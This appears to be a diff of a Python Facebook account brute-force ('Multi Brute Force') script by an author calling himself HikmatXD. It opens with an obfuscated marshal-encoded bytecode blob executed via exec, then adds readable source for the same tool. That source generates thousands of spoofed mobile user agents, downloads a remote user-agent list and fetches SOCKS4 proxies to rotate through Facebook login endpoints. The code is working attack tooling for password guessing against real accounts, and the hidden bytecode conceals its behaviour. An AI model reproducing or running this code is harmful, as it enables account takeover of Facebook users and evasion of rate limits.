\xa1\x00D\x00\x83\x01\xa1\x01}\x0et#d(t\x0c|\x00|\x04f\x03\x16\x00\x83\x01\x01\x00t#d/t\x0c|\x0ef\x02\x16\x00\x83\x01\x01\x00t\x12d0t%\x17\x00d*\x83\x02\xa0\x07|\x00d+\x17\x00|\x04\x17\x00d+\x17\x00|\x0e\x17\x00d,\x17\x00\xa1\x01\x01\x00W\x00\x01\x00\x90\x02qrn\x04W\x00qJW\x00qJ\x04\x00t\x03j&j\'\x90\x02yn\x01\x00\x01\x00\x01\x00t(\xa0)d1\xa1\x01\x01\x00Y\x00qJ0\x00qJt\x0bd\x137\x00a\x0bd\x00S\x00)2Nr\x07\x01\x00\x00r`\x00\x00\x00r@\x00\x00\x00r\x08\x01\x00\x00r\t\x01\x00\x00rT\x00\x00\x00r\x97\x00\x00\x00r\n\x01\x00\x00r\x08\x00\x00\x00r\x0b\x01\x00\x00r\x0c\x01\x00\x00r\r\x01\x00\x00r\x0e\x01\x00\x00r\x96\x00\x00\x00r\x0f\x01\x00\x00r\x15\x01\x00\x00r\x16\x01\x00\x00r\x17\x01\x00\x00r4\x00\x00\x00r\x18\x01\x00\x00r\x19\x01\x00\x00r\x1a\x01\x00\x00r\x1b\x01\x00\x00r\x1d\x01\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00S\x00\x00\x00s\x1c\x00\x00\x00g\x00|\x00]\x14\\\x02}\x01}\x02d\x00|\x01|\x02f\x02\x16\x00\x91\x02q\x04S\x00r\x1e\x01\x00\x00rQ\x00\x00\x00r\x1f\x01\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r#\x01\x00\x00\x92\x03\x00\x00r$\x01\x00\x00z\x1cmobilev2.<locals>.<listcomp>r%\x01\x00\x00r&\x01\x00\x00r\'\x01\x00\x00r(\x01\x00\x00r)\x01\x00\x00r*\x01\x00\x00r+\x01\x00\x00r,\x01\x00\x00r-\x01\x00\x00rm\x00\x00\x00Fr.\x01\x00\x00r/\x01\x00\x00r0\x01\x00\x00r\xec\x00\x00\x00rO\x00\x00\x00r\xbf\x00\x00\x00rB\x00\x00\x00r1\x01\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00S\x00\x00\x00s\x1c\x00\x00\x00g\x00|\x00]\x14\\\x02}\x01}\x02d\x00|\x01|\x02f\x02\x16\x00\x91\x02q\x04S\x00r\x1e\x01\x00\x00rQ\x00\x00\x00r\x1f\x01\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r#\x01\x00\x00\x9c\x03\x00\x00r$\x01\x00\x00r2\x01\x00\x00r\xe9\x00\x00\x00r3\x01\x00\x00\xa9*r\xd8\x00\x00\x00r5\x01\x00\x00rF\x00\x00\x00rH\x00\x00\x00ry\x00\x00\x00rZ\x00\x00\x00r[\x00\x00\x00rM\x00\x00\x00r$\x00\x00\x00r\xc7\x00\x00\x00r\xd6\x00\x00\x00r6\x01\x00\x00r\x1c\x00\x00\x00r\xfa\x00\x00\x00r\x1f\x00\x00\x00r\xfb\x00\x00\x00r\\\x00\x00\x00r\x02\x01\x00\x00rC\x00\x00\x00rD\x00\x00\x00rE\x00\x00\x00r\x9f\x00\x00\x00r7\x01\x00\x00rI\x00\x00\x00rK\x00\x00\x00r\xa3\x00\x00\x00rL\x00\x00\x00rJ\x00\x00\x00r\xa4\x00\x00\x00r8\x01\x00\x00rq\x00\x00\x00r9\x01\x00\x00r:\x01\x00\x00r;\x01\x00\x00r<\x01\x00\x00r\x05\x00\x00\x00r=\x01\x00\x00r>\x01\x00\x00r\x85\x00\x00\x00r\x86\x00\x00\x00r?\x01\x00\x00r\x07\x00\x00\x00r@\x01\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00rO\x01\x00\x00\x83\x03\x00\x00s>\x00\x00\x00\x00\x02\n\x01\x08\x014\x01\n\x01\x08\x01\x04\x01\x12\x01\n\x01\x0c\x02"\x01\x12\x01:\x01\x1e\x01\x08\x010\x01\x1a\x01\x14\x01\x12\x01$\x01\n\x01\x14\x01\n\x01\x1e\x01\x12\x01\x10\x01(\x01\n\x03\x08\x01\x12\x01\x12\x01rO\x01\x00\x00c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x13\x00\x00\x00C\x00\x00\x00s~\x02\x00\x00t\x00\xa0\x01t\x02\xa1\x01}\x02t\x03\xa0\x04\xa1\x00}\x03t\x05j\x06\xa0\x07d\x01t\x08t\tt\n\x83\x01t\x0bt\x0ct\tt\r\x83\x01t\x0et\tt\x0f\x83\x01f\x07\x16\x00\xa1\x01\x01\x00t\x05j\x06\xa0\x10\xa1\x00\x01\x00|\x01D\x00\x90\x02]$}\x04|\x04\xa0\x11\xa1\x00}\x04\x90\x01z\xf2t\x12d\x02d\x03\x83\x02\xa0\x13\xa1\x00\xa0\x14\xa1\x00}\x05t\x00\xa0\x01|\x05\xa1\x01}\x06d\x04d\x05|\x06\x17\x00i\x01}\x07|\x03j\x15\xa0\x16d\x06d\x07d\x08d\t|\x02d\nd\x0bd\x0cd\rd\x0ed\x0f\x9c\n\xa1\x01\x01\x00|\x03\xa0\x17d\x10|\x00\x17\x00d\x11\x17\x00\xa1\x01}\x08t\x18\xa0\x19d\x12t\x1a|\x08j\x1b\x83\x01\xa1\x02\xa0\x1cd\x13\xa1\x01t\x18\xa0\x19d\x14t\x1a|\x08j\x1b\x83\x01\xa1\x02\xa0\x1cd\x13\xa1\x01|\x00d\x15d\x16|\x04d\x17\x9c\x06}\td\x18\xa0\x1dd\x19d\x1a\x84\x00|\x08j\x1e\xa0\x1f\xa1\x00\xa0 \xa1\x00D\x00\x83\x01\xa1\x01}\n|\nd\x1b7\x00}\nd\x06d\x07d\x1cd\x08d\x1dd\td\x1ed\x1f|\x02d\nd d\x0bd\x0cd\rd\x10|\x00\x17\x00d\x11\x17\x00d!d\x0ed"\x9c\x11}\x0b|\x03j!d#|\td$|\ni\x01|\x0bd%|\x07d&\x8d\x06}\x0cd\'|\x03j\x1e\xa0\x1f\xa1\x00\xa0"\xa1\x00v\x00\x90\x01r\xb6t#d(t\x0e|\x00|\x04f\x03\x16\x00\x83\x01\x01\x00t\x12d)t$\x17\x00d*\x83\x02\xa0\x07|\x00d+\x17\x00|\x04\x17\x00d+\x17\x00d,\x17\x00\xa1\x01\x01\x00W\x00\x01\x00\x90\x02qrn\x94d-|\x03j\x1e\xa0\x1f\xa1\x00\xa0"\xa1\x00v\x00\x90\x02rF|\x0cj\x1e\xa0\x1f\xa1\x00}\rd\x18\xa0\x1dd.d\x1a\x84\x00|\x03j\x1e\xa0\x1f\xa1\x00\xa0 \xa1\x00D\x00\x83\x01\xa1\x01}\x0et#d(t\x0c|\x00|\x04f\x03\x16\x00\x83\x01\x01\x00t#d/t\x0c|\x0ef\x02\x16\x00\x83\x01\x01\x00t\x12d0t%\x17\x00d*\x83\x02\xa0\x07|\x00d+\x17\x00|\x04\x17\x00d+\x17\x00|\x0e\x17\x00d,\x17\x00\xa1\x01\x01\x00W\x00\x01\x00\x90\x02qrn\x04W\x00qJW\x00qJ\x04\x00t\x03j&j\'\x90\x02yn\x01\x00\x01\x00\x01\x00t(\xa0)d1\xa1\x01\x01\x00Y\x00qJ0\x00qJt\x0bd\x137\x00a\x0bd\x00S\x00)2Nr\x07\x01\x00\x00r`\x00\x00\x00r@\x00\x00\x00r\x08\x01\x00\x00r\t\x01\x00\x00rB\x01\x00\x00r\x97\x00\x00\x00r\n\x01\x00\x00r\x08\x00\x00\x00r\x0b\x01\x00\x00r\x0c\x01\x00\x00r\r\x01\x00\x00r\x0e\x01\x00\x00r\x96\x00\x00\x00r\x0f\x01\x00\x00rC\x01\x00\x00rD\x01\x00\x00r\x17\x01\x00\x00r4\x00\x00\x00r\x18\x01\x00\x00rE\x01\x00\x00r\x1a\x01\x00\x00r\x1b\x01\x00\x00r\x1d\x01\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00S\x00\x00\x00s\x1c\x00\x00\x00g\x00|\x00]\x14\\\x02}\x01}\x02d\x00|\x01|\x02f\x02\x16\x00\x91\x02q\x04S\x00r\x1e\x01\x00\x00rQ\x00\x00\x00r\x1f\x01\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r#\x01\x00\x00\xb7\x03\x00\x00r$\x01\x00\x00z\x1cmbasicv2.<locals>.<listcomp>r%\x01\x00\x00r&\x01\x00\x00r\'\x01\x00\x00rF\x01\x00\x00r)\x01\x00\x00r*\x01\x00\x00r+\x01\x00\x00r,\x01\x00\x00rG\x01\x00\x00rm\x00\x00\x00Fr.\x01\x00\x00r/\x01\x00\x00r0\x01\x00\x00r\xec\x00\x00\x00rO\x00\x00\x00r\xbf\x00\x00\x00rB\x00\x00\x00r1\x01\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00S\x00\x00\x00s\x1c\x00\x00\x00g\x00|\x00]\x14\\\x02}\x01}\x02d\x00|\x01|\x02f\x02\x16\x00\x91\x02q\x04S\x00r\x1e\x01\x00\x00rQ\x00\x00\x00r\x1f\x01\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r#\x01\x00\x00\xc1\x03\x00\x00r$\x01\x00\x00r2\x01\x00\x00r\xe9\x00\x00\x00r3\x01\x00\x00rR\x01\x00\x00r@\x01\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00rP\x01\x00\x00\xa8\x03\x00\x00s>\x00\x00\x00\x00\x02\n\x01\x08\x014\x01\n\x01\x08\x01\x04\x01\x12\x01\n\x01\x0c\x02"\x01\x12\x01:\x01\x1e\x01\x08\x010\x01\x1a\x01\x14\x01\x12\x01$\x01\n\x01\x14\x01\n\x01\x1e\x01\x12\x01\x10\x01(\x01\n\x03\x08\x01\x12\x01\x12\x01rP\x01\x00\x00c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x13\x00\x00\x00C\x00\x00\x00s~\x02\x00\x00t\x00\xa0\x01t\x02\xa1\x01}\x02t\x03\xa0\x04\xa1\x00}\x03t\x05j\x06\xa0\x07d\x01t\x08t\tt\n\x83\x01t\x0bt\x0ct\tt\r\x83\x01t\x0et\tt\x0f\x83\x01f\x07\x16\x00\xa1\x01\x01\x00t\x05j\x06\xa0\x10\xa1\x00\x01\x00|\x01D\x00\x90\x02]$}\x04|\x04\xa0\x11\xa1\x00}\x04\x90\x01z\xf2t\x12d\x02d\x03\x83\x02\xa0\x13\xa1\x00\xa0\x14\xa1\x00}\x05t\x00\xa0\x01|\x05\xa1\x01}\x06d\x04d\x05|\x06\x17\x00i\x01}\x07|\x03j\x15\xa0\x16d\x06d\x07d\x08d\t|\x02d\nd\x0bd\x0cd\rd\x0ed\x0f\x9c\n\xa1\x01\x01\x00|\x03\xa0\x17d\x10|\x00\x17\x00d\x11\x17\x00\xa1\x01}\x08t\x18\xa0\x19d\x12t\x1a|\x08j\x1b\x83\x01\xa1\x02\xa0\x1cd\x13\xa1\x01t\x18\xa0\x19d\x14t\x1a|\x08j\x1b\x83\x01\xa1\x02\xa0\x1cd\x13\xa1\x01|\x00d\x15d\x16|\x04d\x17\x9c\x06}\td\x18\xa0\x1dd\x19d\x1a\x84\x00|\x08j\x1e\xa0\x1f\xa1\x00\xa0 \xa1\x00D\x00\x83\x01\xa1\x01}\n|\nd\x1b7\x00}\nd\x06d\x07d\x1cd\x08d\x1dd\td\x1ed\x1f|\x02d\nd d\x0bd\x0cd\rd\x10|\x00\x17\x00d\x11\x17\x00d!d\x0ed"\x9c\x11}\x0b|\x03j!d#|\td$|\ni\x01|\x0bd%|\x07d&\x8d\x06}\x0cd\'|\x03j\x1e\xa0\x1f\xa1\x00\xa0"\xa1\x00v\x00\x90\x01r\xb6t#d(t\x0e|\x00|\x04f\x03\x16\x00\x83\x01\x01\x00t\x12d)t$\x17\x00d*\x83\x02\xa0\x07|\x00d+\x17\x00|\x04\x17\x00d+\x17\x00d,\x17\x00\xa1\x01\x01\x00W\x00\x01\x00\x90\x02qrn\x94d-|\x03j\x1e\xa0\x1f\xa1\x00\xa0"\xa1\x00v\x00\x90\x02rF|\x0cj\x1e\xa0\x1f\xa1\x00}\rd\x18\xa0\x1dd.d\x1a\x84\x00|\x03j\x1e\xa0\x1f\xa1\x00\xa0 \xa1\x00D\x00\x83\x01\xa1\x01}\x0et#d(t\x0c|\x00|\x04f\x03\x16\x00\x83\x01\x01\x00t#d/t\x0c|\x0ef\x02\x16\x00\x83\x01\x01\x00t\x12d0t%\x17\x00d*\x83\x02\xa0\x07|\x00d+\x17\x00|\x04\x17\x00d+\x17\x00|\x0e\x17\x00d,\x17\x00\xa1\x01\x01\x00W\x00\x01\x00\x90\x02qrn\x04W\x00qJW\x00qJ\x04\x00t\x03j&j\'\x90\x02yn\x01\x00\x01\x00\x01\x00t(\xa0)d1\xa1\x01\x01\x00Y\x00qJ0\x00qJt\x0bd\x137\x00a\x0bd\x00S\x00)2Nr\x07\x01\x00\x00r`\x00\x00\x00r@\x00\x00\x00r\x08\x01\x00\x00r\t\x01\x00\x00rH\x01\x00\x00r\x97\x00\x00\x00r\n\x01\x00\x00r\x08\x00\x00\x00r\x0b\x01\x00\x00r\x0c\x01\x00\x00r\r\x01\x00\x00r\x0e\x01\x00\x00r\x96\x00\x00\x00r\x0f\x01\x00\x00rI\x01\x00\x00rJ\x01\x00\x00r\x17\x01\x00\x00r4\x00\x00\x00r\x18\x01\x00\x00rK\x01\x00\x00r\x1a\x01\x00\x00r\x1b\x01\x00\x00r\x1d\x01\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00S\x00\x00\x00s\x1c\x00\x00\x00g\x00|\x00]\x14\\\x02}\x01}\x02d\x00|\x01|\x02f\x02\x16\x00\x91\x02q\x04S\x00r\x1e\x01\x00\x00rQ\x00\x00\x00r\x1f\x01\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r#\x01\x00\x00\xdc\x03\x00\x00r$\x01\x00\x00z\x1afreev2.<locals>.<listcomp>r%\x01\x00\x00r&\x01\x00\x00r\'\x01\x00\x00rL\x01\x00\x00r)\x01\x00\x00r*\x01\x00\x00r+\x01\x00\x00r,\x01\x00\x00rM\x01\x00\x00rm\x00\x00\x00Fr.\x01\x00\x00r/\x01\x00\x00r0\x01\x00\x00r\xec\x00\x00\x00rO\x00\x00\x00r\xbf\x00\x00\x00rB\x00\x00\x00r1\x01\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00S\x00\x00\x00s\x1c\x00\x00\x00g\x00|\x00]\x14\\\x02}\x01}\x02d\x00|\x01|\x02f\x02\x16\x00\x91\x02q\x04S\x00r\x1e\x01\x00\x00rQ\x00\x00\x00r\x1f\x01\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r#\x01\x00\x00\xe6\x03\x00\x00r$\x01\x00\x00r2\x01\x00\x00r\xe9\x00\x00\x00r3\x01\x00\x00rR\x01\x00\x00r@\x01\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00rQ\x01\x00\x00\xcd\x03\x00\x00s>\x00\x00\x00\x00\x02\n\x01\x08\x014\x01\n\x01\x08\x01\x04\x01\x12\x01\n\x01\x0c\x02"\x01\x12\x01:\x01\x1e\x01\x08\x010\x01\x1a\x01\x14\x01\x12\x01$\x01\n\x01\x14\x01\n\x01\x1e\x01\x12\x01\x10\x01(\x01\n\x03\x08\x01\x12\x01\x12\x01rQ\x01\x00\x00)\x8drH\x00\x00\x00Z\x03bs4Z\x04richrW\x00\x00\x00rZ\x00\x00\x00r\xd8\x00\x00\x00rK\x00\x00\x00Z\x08datetimer?\x01\x00\x00rz\x00\x00\x00Z\tstdiomaskZ\x12concurrent.futuresr\x02\x00\x00\x00r\xf8\x00\x00\x00r\x03\x00\x00\x00Z\x03sopZ\nrich.panelr\x04\x00\x00\x00r~\x00\x00\x00r\x05\x00\x00\x00r}\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00r]\x00\x00\x00Z\x02FRZ\x03nowZ\x03dayZ\x03tglrL\x00\x00\x00Z\x05monthZ\x03blnZ\x04yearZ\x03thnr\xb0\x00\x00\x00r=\x01\x00\x00r>\x01\x00\x00r\xa6\x00\x00\x00r6\x01\x00\x00r\xd5\x00\x00\x00r\xf2\x00\x00\x00r\xc6\x00\x00\x00r\xfa\x00\x00\x00r\xfb\x00\x00\x00rF\x00\x00\x00r\xd1\x00\x00\x00r\xd6\x00\x00\x00r\xf5\x00\x00\x00r\xf3\x00\x00\x00r\xf6\x00\x00\x00r\xf7\x00\x00\x00r\xc5\x00\x00\x00Z\x04xyzxZ\x02rrr5\x01\x00\x00Z\x02rcZ\x02aZZ\x06ugent1rG\x00\x00\x00Z\x06ugent2Z\x06ugent3r^\x00\x00\x00rO\x00\x00\x00Z\trandranger\xde\x00\x00\x00r\xb3\x00\x00\x00r\xd4\x00\x00\x00rb\x00\x00\x00\xda\x01f\xda\x01g\xda\x01h\xda\x01i\xda\x01j\xda\x01kZ\x04uakurP\x00\x00\x00\xda\x01lZ\x05uaku2Z\x05yzirxZ\x03uakrS\x00\x00\x00Z\x04m_fbr\xa0\x00\x00\x00r\xa1\x00\x00\x00r\xa2\x00\x00\x00Z\thead_gruprV\x00\x00\x00r_\x00\x00\x00rc\x00\x00\x00r$\x00\x00\x00r!\x00\x00\x00r\x1c\x00\x00\x00r\x1f\x00\x00\x00r\x16\x00\x00\x00r)\x00\x00\x00r#\x00\x00\x00r"\x00\x00\x00\xda\x01oZ\x02Z2r\x94\x00\x00\x00Z\x02M3r\x80\x00\x00\x00Z\x02H3r\xaf\x00\x00\x00Z\x02K3Z\x02B2Z\x02B3Z\x02U2Z\x02U3Z\x02N2Z\x02N3Z\x02O2Z\x02O3r|\x00\x00\x00Z\x02P3Z\x02J2Z\x02J3Z\x02A2Z\x10warna_warni_richr\x7f\x00\x00\x00rj\x00\x00\x00Z\x04hourr\xae\x00\x00\x00rk\x00\x00\x00r\x8b\x00\x00\x00r\x84\x00\x00\x00r\x95\x00\x00\x00r\x82\x00\x00\x00r\xb1\x00\x00\x00r\xb4\x00\x00\x00r\xb5\x00\x00\x00r\xc8\x00\x00\x00r\xd9\x00\x00\x00r\xfc\x00\x00\x00r\xdd\x00\x00\x00r\xdf\x00\x00\x00r\xe0\x00\x00\x00r\xda\x00\x00\x00rN\x01\x00\x00rO\x01\x00\x00rP\x01\x00\x00rQ\x01\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00\xda\x08<module>\x0b\x00\x00\x00s:\x01\x00\x00X\x02\x0c\x01\x0c\x01\x0c\x01\x0c\x01\x0c\x01\x0c\x02\x1e\x01\x0c\x01\x14\x01\x0c\x01 \x01$\x01$\x01,\x01\x14\x02\x0e\x01\x06\x01\x06\x01\x08\x01V\x01\x0c\x01\n\x01f\x01\x0c\x01\n\x01L\x01\x0c\x01\x0e\x02\x0e\x01\x04\x01\x0c\x01\x0c\x01\x04\x01\x0c\x01\x04\x01\x0c\x01\x0c\x01\x0c\x01\x0c\x01\x04\x01<\x01\n\x03\x04\x01\x0e\x01\x04\x01\x0e\x01\x0c\x01\x0e\x01\x04\x01\x0c\x01\x04\x01\x0c\x01\x0c\x01\x04\x01B\x01\x0e\x02\x0c\x01\x04\x01\x0c\x01\x0c\x01\x0e\x01\x0e\x01\x0e\x01\x0e\x01\x0c\x01\x04\x01\x0c\x01\x0c\x01\x04\x01>\x01\x08\r\x04\x01\x04\x01\x04\x01\x04\x01\x08\x02\x08\x02\x08\x04\x08\t\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x02\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x1c\x01\x18\x01\x18\x02\n\x01\x06\x01\n\x01\x06\x01\x1c\x01\x06\x01\x1c\x01\x06\x01\x1c\x01\x06\x01\x1c\x01\x06\x02\x04\x02\x08\x0c\x08"\x08%\x08\x1b\n\x01\x06\x01\n\x01\x06\x01\x1c\x01\x06\x01\x1c\x01\x06\x01\x1c\x01\x06\x01\x1c\x01\x06\x02\x04\x02\x08Z\x08\n\x082\x08\'\x08%\x08M\x086\x08&\x08&\x08&\x08M\x086\x08%\x08%\x08%)\x03\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x05\x00\x00\x00r\x05\x00\x00\x00\xda\x00\xda\x08<module>\x02\x00\x00\x00s\x02\x00\x00\x00\x08\x01'))
+# Author by HikmatXD
+# Jangan Keras Merecode Script Kami!!! 
+# https://github.com/HIKMAT-xyz
+# Jangan lupa follow github saya:)
+     
+     # Corporation Arona Multi Brute Force
+     # Tricker Not Hacker
+     # Fb : Hikmat Ceremony Queenz Sr.
+     # Whastapp : 082115413282
+
+import requests,bs4,rich,os,sys,random,re,datetime,time,json,stdiomask
+
+from concurrent.futures import ThreadPoolExecutor as tread
+from bs4 import BeautifulSoup as sop
+from rich.panel import Panel as panel
+from rich import print as vprint
+from random import randint
+from time import sleep as turu
+
+FR = {'1':'januari','2':'februari','3':'maret','4':'april','5':'mei','6':'juni','7':'juli','8':'agustus','9':'september','10':'oktober','11':'november','12':'desember'}
+tgl = datetime.datetime.now().day
+bln = FR[(str(datetime.datetime.now().month))]
+thn = datetime.datetime.now().year
+sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
+cpz = str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
+okz = str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
+id,loop,id2,metode,uid,ok,cp,ua_crack,id3,id4=[],0,[],[],[],0,0,[],[],[]
+pw_ni,pw_tambahan,pw_belakang,pw_lu,tampilkan_ttl,tampilkan_apk,tampilkan_opsi=[],[],[],[],[],[],[]
+
+for xyzx in range(1000):
+	rr = random.randint
+	rc = random.choice
+	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
+	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
+	if ugent1 in ua_crack:pass
+	else:ua_crack.append(ugent1)
+	ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
+	if ugent2 in ua_crack:pass
+	else:ua_crack.append(ugent2)
+	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
+	if ugent3 in ua_crack:pass
+	else:ua_crack.append(ugent3)
+	
+for xnxx in range(10000):
+	a='Mozilla/5.0 (Symbian/3; Series60/'
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='Nokia'
+	e=random.randrange(100, 9999)
+	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+	g=random.randrange(1, 9)
+	h=random.randrange(1, 4)
+	i=random.randrange(1, 4)
+	j=random.randrange(1, 4)
+	k='Mobile Safari/535.1'
+	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+	ua_crack.append(uaku)
+
+
+	aa='Mozilla/5.0 (Linux; U; Android'
+	b=random.choice(['6','7','8','9','10','11','12'])
+	c=' en-us; GT-'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ua_crack.append(uaku2)
+
+for yzirx in range(10):
+	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
+	b=random.randrange(100, 9999)
+	c=random.randrange(100, 9999)
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	h=random.randrange(1, 9)
+	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
+	j=random.randrange(1, 9)
+	k=random.randrange(1, 9)
+	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
+	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
+def uakdo():
+	try:
+		ua=open('bbnew.txt','r').read().splitlines()
+		for ub in ua:
+			ua_crack.append(ub)
+	except:
+		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
+		ua=open('.bbnew.txt','w')
+		aa=re.findall('line">(.*?)<',str(a))
+		for un in aa:
+			ua.write(un+'\n')
+		ua=open('.bbnew.txt','r').read().splitlines()
+
+m_fb = "m.facebook.com"
+url_businness = "https://business.facebook.com"
+ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
+web_fb = "https://www.facebook.com/"
+head_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
+
+#ua_crack = open("useragent_hikmat.txt","r").read().splitlines()
+
+def clear():
+	os.system('clear')
+def jalan(xnxx):
+	for ewe in xnxx + '\n':
+		sys.stdout.write(ewe);sys.stdout.flush();turu(0.05)
+
+def proxp():
+	try:
+		proxf = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+		open('proxy_mat.txt','w').write(proxf)
+	except Exception as e:
+		print('Failed')
+	proxf = open('proxy_mat.txt','r').read().splitlines()
+
+
+P = "\x1b[0;97m" # Putih
+M = "\x1b[0;91m" # Merah
+H = "\x1b[0;92m" # Hijau
+K = "\x1b[0;93m" # Kuning
+B = "\x1b[0;94m" # Biru
+U = "\x1b[0;95m" # Ungu
+O = "\x1b[0;96m" # Biru Muda
+N = "\033[0m"    # Warna Mati
+o = '\033[1;36m'
+
+Z2 = "[#000000]" # HITAM
+M2 = "[#FF0000]" # MERAH
+M3 = "#FF0000" # MERAH
+H2 = "[#00FF00]" # HIJAU
+H3 = "#00FF00" # HIJAU
+K2 = "[#FFFF00]" # KUNING
+K3 = "#FFFF00" # KUNING
+B2 = "[#00C8FF]" # BIRU
+B3 = "#00C8FF" # BIRU
+U2 = "[#AF00FF]" # UNGU
+U3 = "#AF00FF" # UNGU
+N2 = "[#FF00FF]" # PINK
+N3 = "#FF00FF" # PINK
+O2 = "[#00FFFF]" # BIRU MUDA
+O3 = "#00FFFF" # BIRU MUDA
+P2 = "[#FFFFFF]" # PUTIH
+P3 = "#FFFFFF" # PUTIH
+J2 = "[#FF8F00]" # JINGGA
